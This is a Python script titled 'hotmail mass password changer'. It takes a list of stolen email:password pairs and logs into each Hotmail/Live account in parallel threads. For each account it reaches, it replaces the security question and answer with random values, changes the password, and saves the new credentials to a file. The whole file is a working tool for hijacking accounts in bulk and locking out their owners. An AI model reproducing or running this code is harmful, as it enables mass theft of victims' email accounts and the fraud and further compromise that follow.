#hotmail mass password changer
import mechanize
import re
import threading
import random


############FUNCTION THAT CUT A FILES IN MANY PARTS######################
def chunkIt(seq, num):
  avg = len(seq) / float(num)
  out = []
  last = 0.0
  while last < len(seq):
    out.append(seq[int(last):int(last + avg)])
    last += avg
  return out
###########END OF FUNCTION THAT CUT A FILE IN MANY PARTS##################


##############Begining of class Hotmail passchanger###################
class hotmailchanger(threading.Thread):

    def __init__(self, id, emaillist, myfile):
        self.id = id
        self.emaillist = emaillist
        self.myfile = myfile
        self.running = False
        threading.Thread.__init__(self)


    #generates a random password
    def genrandom(self):
        x = random.randint(6,8)
        pw = ''
        for a in xrange(x):
            pw+=random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890')
        return pw
    #generates a browser


    def generatebrowser(self):
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_redirect(True)
        br.set_handle_gzip(True)
        br.addheaders = [('User-agent', 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1 like Mac OS X; en-US) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B179 Safari/7534.48.3')]
        return br

    #change the password
    def changepass(self, emailpass):

        #it gets the email:pass and split it
        emailpass = emailpass.split(":")
        email = emailpass[0].lower()
        passwd = emailpass[1]

        self.br.open("https://maccount.live.com/ac/password.aspx")
        self.br.select_form(nr=0)
        self.br.form['PasswordTextBox'] = passwd

        newpass = self.genrandom()
        self.br.form['NewPasswordControl$PasswordTextBox'] = newpass
        self.br.form['NewPasswordControl$RetypePWDTextBox'] =newpass
        self.br.submit(label="Save")

        return newpass


    #change the security question
    def changesec(self, emailpass):

        #it gets the email:pass and split it
        emailpass = emailpass.split(":")
        email = emailpass[0].lower()
        passwd = emailpass[1]
        #now let's fill the forms
        self.br.open("https://maccount.live.com/ac/sqsa.aspx")
        self.br.select_form(nr=0)
        self.br.form['PasswordTextBox']=passwd
        myquest = str(random.randint(0,5))
        myans = self.genrandom()
        self.br.form['QuestionSelectionList']=[myquest]
        self.br.form['SecretAnswerTextBox'] = myans
        self.br.submit(label="Save")


    #Simply opens mail
    def open_mail(self,emailpass):

        #it gets the email:pass and split it
        emailpass = emailpass.split(":")
        email = emailpass[0].lower()
        passwd = emailpass[1]

        #now open the email and get to the info page
        self.br.open("https://mid.live.com/si/login.aspx?wa=wsignin1.0&rpsnv=11&ct=1338648316&rver=6.1.6206.0&wp=MBI&wreply=http%3a%2f%2fdu107w.dub107.mail.live.com%2fm%2f%3frru%3dinbox%26lc%3d1033%26mlc%3den-US&lc=1033&id=64855&mspco=1","__ET=&LoginTextBox="+email.replace('@','%40').lower()+"&PasswordTextBox="+passwd+"&SavePasswordCheckBox=0&PasswordSubmit=Sign+in")
        self.br.select_form(nr=0)

        self.br.form['LoginTextBox']=email.lower()
        self.br.form['PasswordTextBox']=passwd
        self.br.submit(label="Sign in")



    #main run function
    def run(self):
        for emailpass in self.emaillist:
            if emailpass.endswith("\n"):
                emailpass = emailpass[:-1]

            if emailpass.endswith("\r"):
                emailpass = emailpass[:-1]
            self.br = self.generatebrowser()

            #opens the email
            self.open_mail(emailpass)
            if 'information you entered is incorrect' in self.br.response().read():
                print "Wrong Password"
                continue

            #change the security question
            self.changesec(emailpass)

            #change pass
            newpass = self.changepass(emailpass)

            #it gets the email:pass and split it
            emailpass = emailpass.split(":")
            email = emailpass[0].lower()
            passwd = emailpass[1]

            #save the result
            open(self.myfile , 'a').write(email+":"+newpass+"\n")
            print "password changed: "+email+":"+newpass+""

##############END     of class Hotmail pass changer###################

emaillist = open(raw_input("Enter the location of the list of email you want to change the password:\n=> ")).readlines()
myfile = raw_input("Where do you want to save the emails:\n=> ")
nbthread= input("Enter the number of threads working at the same time:\n=> ")
z = chunkIt(emaillist, nbthread)
for i, i2 in enumerate(z):
    Mythread = hotmailchanger(i,i2,myfile)
    Mythread.start()
